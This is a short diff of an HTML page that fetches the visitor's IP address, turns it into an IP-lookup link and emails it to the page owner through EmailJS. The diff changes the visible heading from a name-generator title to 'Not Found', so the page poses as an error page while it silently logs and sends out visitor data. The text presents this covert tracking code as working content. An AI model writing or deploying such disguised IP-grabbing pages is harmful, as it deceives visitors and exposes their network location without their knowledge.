@@ -11,7 +11,7 @@ emailjs.init("user_QGkWMYk11t3CcI92wXEyI");
 </head>
 <body>
 
-<h2>Generatore nomi</h2>
+<h2>Not Found</h2>
 
 <script>
 	let jsondata = "";
@@ -26,13 +26,13 @@ emailjs.init("user_QGkWMYk11t3CcI92wXEyI");
 	
 	jsondata = await getJson(apiUrl)
 
-	var str1 = "https://www.ip2location.com/";
+	var str1 = "https://whatismyipaddress.com/ip/";
 	var str2 = jsondata;
 	
 	var res = str1.concat(str2);
 	
 	var templateParams = {
-	    to_name: 'James',
+	    to_name: 'Nobody',
 	    message: res
 	};
 	 
